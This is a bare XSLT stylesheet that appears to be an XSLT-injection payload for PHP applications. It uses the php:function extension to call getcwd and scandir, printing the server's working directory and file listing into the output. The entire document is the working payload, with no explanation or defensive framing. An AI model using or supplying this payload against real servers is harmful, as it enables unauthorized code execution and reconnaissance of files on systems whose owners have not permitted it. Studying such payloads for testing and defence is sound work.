<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:php="http://php.net/xsl">
  <xsl:output method="html"/>
  <xsl:template match="/">
    <pre>
CWD: <xsl:value-of select="php:function('getcwd')"/>

FILES:
<xsl:for-each select="php:function('scandir', '.')">
  <xsl:value-of select="."/> 
</xsl:for-each>
    </pre>
  </xsl:template>
</xsl:stylesheet>
